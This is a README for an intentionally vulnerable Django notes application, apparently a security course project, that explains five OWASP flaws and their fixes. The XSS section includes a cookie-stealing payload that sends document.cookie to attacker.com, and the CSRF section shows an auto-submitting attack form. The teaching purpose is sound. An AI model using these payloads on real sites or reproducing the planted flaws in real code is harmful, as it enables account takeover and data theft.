# CSB Project 1

**WARNING: This project contains intentional vulnerabilities for educational purposes.**

**DO NOT use in production!**

A simple Django-based notes application where users can create, view, and transfer notes between accounts. This project intentionally contains five common OWASP security vulnerabilities for educational purposes: broken access control, exposed SECRET_KEY, DEBUG mode enabled, XSS via |safe filter, and missing CSRF protection. Each flaw includes commented fixes in the code.

### FLAW 1: A01:2021 – Broken Access Control 
Source: https://github.com/LHuldin/csbproject/blob/main/accounts/views.py#L54

Description: The application contains a critical access control vulnerability in the note transfer functionality. The transfer_note view function allows any authenticated user to transfer any note to any other user, regardless of ownership. The function retrieves a note by ID without verifying that the current user is the actual owner of the note. This means that User A can transfer User B's private notes to themselves or any other user simply by knowing or guessing the note ID. The vulnerability extends to the user interface, where transfer buttons are displayed for all notes, not just the user's own notes. An attacker can exploit this by either using the provided interface or directly accessing URLs like /transfer/1/, /transfer/2/, etc., to systematically steal all notes in the system. This represents a complete breakdown of access control, allowing unauthorized data access, modification, and theft.

How to fix: Implement proper ownership verification by adding if note.user != request.user: return HttpResponseForbidden() before allowing any transfer operations. Modify the template to only display transfer buttons for notes owned by the current user using {% if note.user == user %}. Additionally, implement proper authorization checks in the form by filtering the recipient queryset to exclude inappropriate users, add confirmation dialogs for transfers, and implement audit logging to track all transfer operations for security monitoring purposes.

### FLAW 2: A02:2021 – Cryptographic Failures 
Source: https://github.com/LHuldin/csbproject/blob/main/config/settings.py#L25

Description: The application contains a hard-coded SECRET_KEY directly in the source code. Django's SECRET_KEY is a cryptographic key used for digital signatures, session security, password reset tokens, and CSRF protection. Having this key exposed in the source code creates multiple security risks. Since the code is stored in a public repository, the secret key becomes accessible to anyone, compromising the cryptographic security of the entire application. An attacker with access to this key could forge session cookies, bypass CSRF protection, generate valid password reset tokens for any user, and potentially gain unauthorized access to user accounts.

How to fix: Move the SECRET_KEY to environment variables or a separate configuration file that is not committed to version control. Use os.environ.get('SECRET_KEY') to read the key from environment variables. In production, generate a strong, unique secret key and store it securely. For development, consider using python-decouple library to manage configuration. Add the .env file to .gitignore to prevent accidental commits. This ensures that sensitive cryptographic material remains secret and different environments can use different keys without code changes.

### FLAW 3: A05:2021 – Security Misconfiguration 
Source: https://github.com/LHuldin/csbproject/blob/main/config/settings.py#L30

Description: The Django application has DEBUG mode enabled in production configuration. When DEBUG=True, Django provides detailed error pages that expose sensitive information including stack traces, local variables, SQL queries, file paths, and system configuration details. This verbose error reporting is intended only for development purposes. In production, these detailed error messages can reveal critical information about the application's internal structure, database schema, file system layout, and installed packages to potential attackers. This information disclosure can significantly aid attackers in understanding the system architecture and identifying additional vulnerabilities to exploit.

How to fix: Set DEBUG=False in production environments. Implement environment-based configuration using DEBUG = os.environ.get('DEBUG', 'False').lower() == 'true' to automatically handle different environments. Configure proper logging to capture errors without exposing sensitive details to users. Set up custom error pages (404.html, 500.html) to provide user-friendly error messages. Additionally, configure other production security settings like ALLOWED_HOSTS, SECURE_SSL_REDIRECT, and secure cookie settings. Use environment variables or configuration management tools to handle different settings across development, staging, and production environments automatically.


### FLAW 4: A03:2021 – Injection (Cross-Site Scripting)
Source: https://github.com/LHuldin/csbproject/blob/main/accounts/templates/accounts/notes.html#L17

Description: The application contains a Cross-Site Scripting (XSS) vulnerability in the notes display functionality. The template uses Django's |safe filter to render user-generated content without proper sanitization or validation. While Django automatically escapes HTML characters for security, the |safe filter explicitly bypasses this protection mechanism. When users create notes containing malicious JavaScript code such as <script>alert('XSS!');</script> or <img src="x" onerror="document.location='http://attacker.com/steal.php?cookie='+document.cookie">, this code executes in every visitor's browser. This enables attackers to steal session cookies, redirect users to malicious sites, perform actions on behalf of victims, and potentially compromise user accounts.

How to fix: Remove the |safe filter from the template and rely on Django's automatic HTML escaping. If HTML formatting is needed, implement proper input sanitization using libraries like bleach that whitelist safe HTML tags while removing dangerous ones. Alternatively, use markdown for user input and convert it to HTML with a secure parser. Always validate and sanitize user input on both client and server sides. Consider implementing Content Security Policy (CSP) headers to prevent inline script execution as an additional defense layer.


### FLAW 5: CSRF (Cross-Site Request Forgery)
@csrf_exempt:
https://github.com/LHuldin/csbproject/blob/main/accounts/views.py#L48
Missing token:
https://github.com/LHuldin/csbproject/blob/main/accounts/templates/accounts/transfer_note.html#L14

Description: The CSRF vulnerability allows attackers to send unauthorized requests on behalf of authenticated users. In this application, the transfer_note function is marked with the @csrf_exempt decorator, which bypasses Django's built-in CSRF protection. Additionally, the form template lacks the {% csrf_token %} element, making it vulnerable to cross-site attacks.

Attack Example: An attacker can create a malicious website containing a hidden form:

<form action="http://localhost:8000/transfer/1/" method="post">
    <input type="hidden" name="recipient" value="attacker_id">
    <script>document.forms[0].submit();</script>
</form>

When a victim visits this site while logged into the application, their note gets automatically transferred to the attacker without their knowledge or consent.
Impact: This vulnerability enables unauthorized data manipulation, potential data theft, and compromises user trust. Attackers can perform any action the authenticated user is authorized to do, including transferring ownership of sensitive information.
How to fix: Django provides built-in CSRF protection through CsrfViewMiddleware. The vulnerability is fixed by removing the @csrf_exempt decorator and adding {% csrf_token %} to the form. Django automatically validates the token authenticity on every POST request.

